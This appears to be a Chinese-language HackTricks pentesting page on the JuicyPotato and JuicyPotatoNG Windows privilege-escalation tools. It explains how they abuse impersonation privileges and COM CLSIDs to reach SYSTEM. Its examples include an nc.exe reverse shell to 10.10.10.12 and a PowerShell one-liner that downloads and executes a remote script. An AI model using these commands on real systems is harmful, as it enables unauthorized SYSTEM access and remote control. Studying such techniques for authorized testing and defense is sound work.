# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato 已过时。它通常适用于 Windows 10 1803 / Windows Server 2016 及更早版本。Microsoft 从 Windows 10 1809 / Server 2019 开始发布的更改破坏了原始 technique。对于这些版本及更新版本，请考虑使用 PrintSpoofer、RoguePotato、SharpEfsPotato/EfsPotato、GodPotato 等现代替代方案。有关最新选项和用法，请参阅下面的页面。

{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato（滥用 golden privileges）<a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_这是_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_ 的增强版本，加入了一些 juice，也就是**另一个 Local Privilege Escalation 工具，可将 Windows Service Accounts 提权为 NT AUTHORITY\SYSTEM**_<sup>[[1]](#references)</sup>

#### 你可以从 [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) 下载 juicypotato

### Compatibility 快速说明

- 当当前上下文拥有 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege 时，可靠支持 Windows 10 1803 和 Windows Server 2016 及更早版本。
- 在 Windows 10 1809 / Windows Server 2019 及更高版本中，Microsoft 的 hardening 使其失效。对于这些版本，请优先使用上面链接的替代方案。

### Summary <a href="#summary" id="summary"></a>

[**来自 juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**：**<sup>[[1]](#references)</sup>

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) 及其 [variants](https://github.com/decoder-it/lonelypotato) 利用基于 [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) 的 privilege escalation chain，该 service 在 `127.0.0.1:6666` 上运行 MiTM listener，并且要求你拥有 `SeImpersonate` 或 `SeAssignPrimaryToken` privileges。在一次 Windows build review 中，我们发现了这样一种环境：`BITS` 被有意禁用，而端口 `6666` 已被占用。

我们决定将 [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) weaponize：**请关注 Juicy Potato。**

> 关于理论部分，请参阅 [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)，并沿着其中的链接和 references 继续阅读。<sup>[[4]](#references)</sup>

除了 `BITS` 之外，还可以滥用多个 COM servers。它们只需要：

1. 能够由当前用户实例化，通常当前用户是拥有 impersonation privileges 的“service user”
2. 实现 `IMarshal` interface
3. 以 elevated user（SYSTEM、Administrator 等）身份运行

经过一些测试，我们在多个 Windows 版本上获取并测试了一个包含大量 [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) 的列表。

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato 允许你：<sup>[[1]](#references)</sup>

- **Target CLSID** _选择任意所需的 CLSID。_ [_这里_](http://ohpe.it/juicy-potato/CLSID/) _可以找到按 OS 整理的列表。_
- **COM Listening port** _定义首选的 COM listening port（而不是 marshalled hardcoded 6666）_
- **COM Listening IP address** _将 server 绑定到任意 IP_
- **Process creation mode** _根据 impersonated user 的 privileges，你可以选择：_
- `CreateProcessWithToken`（需要 `SeImpersonate`）
- `CreateProcessAsUser`（需要 `SeAssignPrimaryToken`）
- `both`
- **Process to launch** _如果 exploitation 成功，则启动一个 executable 或 script_
- **Process Argument** _自定义启动进程的 arguments_
- **RPC Server address** _为了采用 stealthy approach，你可以向 external RPC server 进行 authentication_
- **RPC Server port** _如果你想向 external server 进行 authentication，且 firewall 正在阻止端口 `135`，则此选项很有用……_
- **TEST mode** _主要用于 testing，例如测试 CLSID。它会创建 DCOM 并打印 token 的 user。请参阅_ [_这里的测试说明_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### 最终思考 <a href="#final-thoughts" id="final-thoughts"></a>

[**来自 juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**：<sup>[[1]](#references)</sup>

如果用户拥有 `SeImpersonate` 或 `SeAssignPrimaryToken` 权限，那么你就是 **SYSTEM**。

几乎不可能阻止对所有这些 COM Servers 的滥用。你可以考虑通过 `DCOMCNFG` 修改这些对象的权限，但祝你好运，这将非常具有挑战性。

真正的解决方案是保护在 `* SERVICE` 账户下运行的敏感账户和应用程序。停止 `DCOM` 确实可以阻止此 exploit，但可能会对底层 OS 造成严重影响。

来源：[http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>

## JuicyPotatoNG（2022+）

JuicyPotatoNG 通过组合以下技术，在现代 Windows 上重新实现了 JuicyPotato 风格的本地权限提升：<sup>[[2]](#references)</sup>
- 将 DCOM OXID 解析到所选端口上的本地 RPC server，从而避免使用旧的硬编码 127.0.0.1:6666 listener。
- 使用 SSPI hook 捕获并 impersonate 入站的 SYSTEM authentication，无需依赖 RpcImpersonateClient；当仅存在 SeAssignPrimaryTokenPrivilege 时，这也能够使用 CreateProcessAsUser。
- 使用各种技巧满足 DCOM activation constraints（例如，针对 PrintNotify / ActiveX Installer Service classes 时，曾经需要满足的 INTERACTIVE-group requirement）。

重要说明（不同 build 之间的行为仍在变化）：<sup>[[2]](#references)</sup>
- 2022 年 9 月：初始 technique 可通过“INTERACTIVE trick”在受支持的 Windows 10/11 和 Server targets 上运行。
- 2023 年 1 月，作者更新说明：Microsoft 后来阻止了 INTERACTIVE trick。另一个 CLSID（{A9819296-E5B3-4E67-8226-5E72CE9E1FB7}）恢复了 exploitation，但根据作者的文章，它仅适用于 Windows 11 / Server 2022。

基本用法（help 中包含更多 flags）：
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
如果你的目标是 Windows 10 1809 / Server 2019，且 classic JuicyPotato 已被修补，请优先使用顶部链接中的替代方案（RoguePotato、PrintSpoofer、EfsPotato/GodPotato 等）。NG 的效果可能取决于具体 build 和 service 状态。

## Examples

注意：访问[此页面](https://ohpe.it/juicy-potato/CLSID/)获取可尝试的 CLSIDs 列表。

### Get a nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Launch a new CMD（如果你拥有 RDP 访问权限）

![Powershell rev - Launch a new CMD（如果你拥有 RDP 访问权限）：Launch a new CMD（如果你拥有 RDP 访问权限）](<../../images/image (300).png>)

## CLSID Problems

JuicyPotato 使用的默认 CLSID **经常无法工作**，导致 exploit 失败。通常需要多次尝试才能找到一个**可用的 CLSID**。若要获取特定操作系统的 CLSID 列表，请访问此页面：

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Checking CLSIDs**

首先，除了 juicypotato.exe 之外，你还需要一些可执行文件。

下载 [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) 并将其加载到 PS session 中，然后下载并执行 [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1)。该脚本会创建一个可供测试的 CLSID 列表。

然后下载 [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)（将路径修改为 CLSID 列表和 juicypotato 可执行文件的路径）并执行。它会开始尝试每个 CLSID，**当端口号发生变化时，就表示该 CLSID 有效**。

使用参数 -c **检查**可用的 CLSID。

## References

- [1] [Juicy Potato README（ohpe/juicy-potato）](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [2] [再给 JuicyPotato 一次机会：JuicyPotatoNG（decoder.it）](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
- [3] [Juicy Potato 项目页面（ohpe.it）](http://ohpe.it/juicy-potato/)
- [4] [Rotten Potato - 从 Service Accounts 到 SYSTEM 的 Privilege Escalation](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
{{#include ../../banners/hacktricks-training.md}}
